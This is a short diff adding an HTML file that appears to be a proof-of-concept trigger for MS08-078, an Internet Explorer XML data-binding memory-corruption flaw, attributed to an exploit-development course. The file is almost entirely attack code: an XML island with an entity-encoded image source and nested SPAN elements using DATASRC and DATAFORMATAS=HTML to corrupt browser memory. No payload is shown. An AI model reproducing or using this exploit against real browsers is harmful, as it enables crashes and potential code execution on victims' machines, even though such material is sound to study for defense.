@@ -1,0 +1,25 @@
+<XML ID=I>
+	<X>
+		<C> <!--
+		// MS08-078, as taught in OFFSEC's 2009 AWE, not even published on exploit-db, I don't think
+		// author: Charles Truscott @r0ss1n1
+		// I love you Alison Thompson OAM
+
+		// r0ss1n1.html && iframe.html, vim iframe.html
+
+			--!>
+
+
+			<![CDATA[ <image src=http://&#3084;&#3084;.xxxxx.org>
+			]]>
+
+		</C>
+	</X>
+</XML>
+
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+	<XML ID=I>
+	</XML>
+	<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
+	</SPAN>
+</SPAN>
